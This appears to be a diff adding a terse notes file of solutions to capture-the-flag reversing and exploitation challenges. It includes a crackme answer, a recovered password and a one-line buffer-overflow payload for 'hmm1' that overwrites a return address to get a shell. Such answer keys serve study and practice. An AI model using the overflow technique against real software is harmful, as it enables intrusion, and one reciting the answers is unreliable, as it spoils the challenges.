@@ -1,0 +1,4 @@
+reverse1: 6338
+reverse2: echo -ne "DCBA\xef\xbe\xad\xde" | ./reverse2
+reverse3: H0m3m4d34553mbly (strlen: 16; kind of xorring 2 parts)
+hmm1: Hmm, what do you think? (python -c "import sys;sys.stdout.buffer.write(b'A'*0x28+b'\xaf\x10\x40\x00'+b'\x00'*4+b'\n')"; cat - ) | ./hmm1
